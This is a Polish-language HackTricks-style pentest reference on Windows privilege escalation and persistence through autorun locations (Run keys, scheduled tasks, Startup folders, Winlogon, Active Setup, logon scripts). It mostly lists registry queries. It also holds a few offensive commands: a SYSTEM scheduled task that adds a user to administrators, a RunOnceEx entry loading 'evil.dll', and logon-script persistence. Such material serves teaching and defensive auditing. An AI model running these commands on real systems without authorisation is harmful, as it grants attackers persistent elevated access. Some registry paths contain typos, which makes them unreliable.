# Eskalacja uprawnień za pomocą Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** może być używany do uruchamiania programów podczas **startup**. Sprawdź, które pliki binarne są zaprogramowane do uruchamiania podczas startup za pomocą:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zaplanowane zadania

**Zadania** mogą być zaplanowane do uruchamiania z **określoną częstotliwością**. Sprawdź, które pliki binarne zaplanowano do uruchamiania za pomocą:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Foldery

Wszystkie pliki binarne znajdujące się w **folderach Startup zostaną wykonane podczas uruchamiania systemu**. Typowe foldery Startup są wymienione poniżej, ale folder Startup jest wskazany w rejestrze. [Przeczytaj tutaj, aby dowiedzieć się gdzie.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Vulnerabilities typu *path traversal* podczas rozpakowywania archiwów (takie jak luka wykorzystana w WinRAR przed wersją 7.13 – CVE-2025-8088) mogą zostać wykorzystane do **umieszczenia payloadów bezpośrednio w tych Startup folders podczas dekompresji**, co skutkuje code execution przy następnym logowaniu użytkownika. Szczegółowe omówienie tej techniki znajduje się tutaj:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Rejestr

> [!TIP]
> [Uwaga z tego miejsca](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Wpis rejestru **Wow6432Node** wskazuje, że używasz 64-bitowej wersji systemu Windows. System operacyjny używa tego klucza do wyświetlania osobnego widoku HKEY_LOCAL_MACHINE\SOFTWARE dla 32-bitowych aplikacji działających w 64-bitowych wersjach systemu Windows.

### Runs

**Powszechnie znane** wpisy AutoRun w rejestrze:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Klucze rejestru znane jako **Run** i **RunOnce** służą do automatycznego uruchamiania programów przy każdym logowaniu użytkownika do systemu. Wiersz poleceń przypisany jako wartość danych klucza może zawierać maksymalnie 260 znaków.<sup>[[2]](#references)</sup>

**Service runs** (mogą kontrolować automatyczne uruchamianie usług podczas bootowania):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

W systemie Windows Vista i nowszych wersjach klucze rejestru **Run** i **RunOnce** nie są generowane automatycznie. Wpisy w tych kluczach mogą bezpośrednio uruchamiać programy lub określać je jako zależności. Na przykład, aby załadować plik DLL podczas logowania, można użyć klucza rejestru **RunOnceEx** wraz z kluczem „Depend”. Pokazuje to dodanie wpisu rejestru uruchamiającego plik „C:\temp\evil.dll” podczas uruchamiania systemu:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Jeśli możesz zapisywać w którymkolwiek z wymienionych rejestrów w **HKLM**, możesz eskalować uprawnienia, gdy zaloguje się inny użytkownik.

> [!TIP]
> **Exploit 2**: Jeśli możesz nadpisać którykolwiek z plików binarnych wskazanych w dowolnym z rejestrów w **HKLM**, możesz zmodyfikować ten plik binarny, dodając backdoor, gdy zaloguje się inny użytkownik, i eskalować uprawnienia.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skróty umieszczone w folderze **Startup** automatycznie uruchamiają usługi lub aplikacje podczas logowania użytkownika albo ponownego uruchomienia systemu. Lokalizacja folderu **Startup** jest zdefiniowana w rejestrze zarówno dla zakresu **Local Machine**, jak i **Current User**. Oznacza to, że każdy skrót dodany do określonych lokalizacji **Startup** zapewni uruchomienie powiązanej usługi lub programu po zakończeniu procesu logowania lub ponownym uruchomieniu systemu, co stanowi prostą metodę planowania automatycznego uruchamiania programów.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Jeśli możesz nadpisać dowolny \[User] Shell Folder w ramach **HKLM**, będziesz w stanie wskazać folder kontrolowany przez siebie i umieścić w nim backdoor, który zostanie wykonany za każdym razem, gdy użytkownik zaloguje się do systemu, prowadząc do eskalacji uprawnień.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Ta wartość rejestru dla użytkownika może wskazywać skrypt lub polecenie wykonywane podczas logowania tego użytkownika. Jest to głównie mechanizm **persistence**, ponieważ działa wyłącznie w kontekście danego użytkownika, ale nadal warto ją sprawdzać podczas przeglądów post-exploitation i autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Jeśli możesz zapisywać tę wartość dla bieżącego użytkownika, możesz ponownie wywołać wykonanie przy następnym interaktywnym logowaniu bez konieczności posiadania uprawnień administratora. Jeśli możesz zapisywać ją w hive innego użytkownika, możesz uzyskać code execution podczas logowania tego użytkownika.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Uwagi:

- Preferuj pełne ścieżki do plików uruchamiających `.bat`, `.cmd`, `.ps1` lub innych, które są już dostępne do odczytu dla użytkownika docelowego.
- To przetrwa wylogowanie i ponowne uruchomienie systemu, dopóki wartość nie zostanie usunięta.
- W przeciwieństwie do `HKLM\...\Run` samo w sobie **nie zapewnia podniesienia uprawnień**; jest to persistence w zakresie użytkownika.

### Klucze Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Zazwyczaj klucz **Userinit** jest ustawiony na **userinit.exe**. Jeśli jednak ten klucz zostanie zmodyfikowany, określony plik wykonywalny również zostanie uruchomiony przez **Winlogon** podczas logowania użytkownika. Podobnie klucz **Shell** powinien wskazywać na **explorer.exe**, który jest domyślną powłoką systemu Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Jeśli możesz nadpisać wartość rejestru lub plik binarny, będziesz w stanie eskalować uprawnienia.

### Ustawienia zasad

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Sprawdź klucz **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Zmiana wiersza polecenia trybu awaryjnego

W rejestrze Windows, w `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, znajduje się wartość **`AlternateShell`**, domyślnie ustawiona na `cmd.exe`. Oznacza to, że po wybraniu podczas uruchamiania opcji „Tryb awaryjny z wierszem polecenia” (przez naciśnięcie klawisza F8) używany jest `cmd.exe`. Możliwe jest jednak skonfigurowanie komputera tak, aby automatycznie uruchamiał się w tym trybie bez konieczności naciskania klawisza F8 i ręcznego wybierania tej opcji.

Kroki tworzenia opcji rozruchu umożliwiającej automatyczne uruchamianie w „Trybie awaryjnym z wierszem polecenia”:<sup>[[5]](#references)</sup>

1. Zmień atrybuty pliku `boot.ini`, aby usunąć flagi tylko do odczytu, systemową i ukrytą: `attrib c:\boot.ini -r -s -h`
2. Otwórz plik `boot.ini` do edycji.
3. Wstaw wiersz taki jak: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Zapisz zmiany w pliku `boot.ini`.
5. Przywróć oryginalne atrybuty pliku: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Zmiana klucza rejestru **AlternateShell** pozwala skonfigurować niestandardową powłokę poleceń, potencjalnie w celu uzyskania nieautoryzowanego dostępu.
- **Exploit 2 (uprawnienia zapisu do PATH):** Posiadanie uprawnień zapisu do dowolnej części systemowej zmiennej **PATH**, szczególnie przed `C:\Windows\system32`, umożliwia wykonanie niestandardowego `cmd.exe`, który może działać jako backdoor, jeśli system zostanie uruchomiony w trybie awaryjnym.
- **Exploit 3 (uprawnienia zapisu do PATH i boot.ini):** Możliwość zapisu do `boot.ini` umożliwia automatyczne uruchomienie trybu awaryjnego, ułatwiając uzyskanie nieautoryzowanego dostępu przy następnym ponownym uruchomieniu.

Aby sprawdzić bieżące ustawienie **AlternateShell**, użyj tych poleceń:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Zainstalowany komponent

Active Setup to funkcja systemu Windows, która **inicjuje działanie przed pełnym załadowaniem środowiska pulpitu**. Priorytetowo wykonuje określone polecenia, które muszą zostać ukończone przed kontynuowaniem logowania użytkownika. Proces ten zachodzi nawet przed uruchomieniem innych wpisów startowych, takich jak te w sekcjach rejestru Run lub RunOnce.

Active Setup jest zarządzany za pomocą następujących kluczy rejestru:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

W tych kluczach istnieją różne podklucze, z których każdy odpowiada określonemu komponentowi. Szczególnie istotne wartości kluczy obejmują:

- **IsInstalled:**
- `0` oznacza, że polecenie komponentu nie zostanie wykonane.
- `1` oznacza, że polecenie zostanie wykonane raz dla każdego użytkownika. Jest to domyślne zachowanie, jeśli wartość `IsInstalled` nie istnieje.
- **StubPath:** Określa polecenie, które ma zostać wykonane przez Active Setup. Może to być dowolny prawidłowy wiersz poleceń, na przykład uruchomienie `notepad`.

**Wnioski dotyczące bezpieczeństwa:**

- Modyfikowanie lub zapisywanie klucza, w którym **`IsInstalled`** ma wartość `"1"` wraz z określonym **`StubPath`**, może prowadzić do nieautoryzowanego wykonania polecenia, potencjalnie umożliwiając privilege escalation.
- Zmiana pliku binarnego wskazywanego przez dowolną wartość **`StubPath`** również może umożliwić privilege escalation, jeśli dostępne są wystarczające uprawnienia.

Do sprawdzenia konfiguracji **`StubPath`** w komponentach Active Setup można użyć następujących poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Omówienie Browser Helper Objects (BHO)

Browser Helper Objects (BHO) to moduły DLL, które dodają dodatkowe funkcje do Microsoft Internet Explorer. Ładują się do Internet Explorer i Windows Explorer przy każdym uruchomieniu. Ich wykonanie może jednak zostać zablokowane przez ustawienie klucza **NoExplorer** na wartość 1, co uniemożliwia ich ładowanie wraz z instancjami Windows Explorer.<sup>[[1]](#references)</sup>

BHO są kompatybilne z Windows 10 za pośrednictwem Internet Explorer 11, ale nie są obsługiwane w Microsoft Edge, domyślnej przeglądarce w nowszych wersjach Windows.

Aby sprawdzić BHO zarejestrowane w systemie, możesz przejrzeć następujące klucze rejestru:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Każdy BHO jest reprezentowany w rejestrze przez swój **CLSID**, który służy jako unikalny identyfikator. Szczegółowe informacje o każdym CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Do wyszukiwania BHO w rejestrze można użyć następujących poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Rozszerzenia Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Należy pamiętać, że rejestr będzie zawierał 1 nowy wpis rejestru dla każdej biblioteki dll, reprezentowany przez **CLSID**. Informacje o CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Sterowniki czcionek

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Polecenie otwierania

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcje wykonywania pliku obrazu
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Należy pamiętać, że wszystkie lokalizacje, w których można znaleźć autoruns, są **już przeszukiwane przez**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Jednak aby uzyskać **bardziej kompleksową listę automatycznie uruchamianych** plików, można użyć narzędzia [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) firmy systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Więcej

**Więcej wpisów Autoruns, takich jak rejestry, znajdziesz w** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## Referencje

- [1] [Typowe mechanizmy persistence malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Kategorie autostartu (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [How can I add a boot option that starts an alternate shell?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
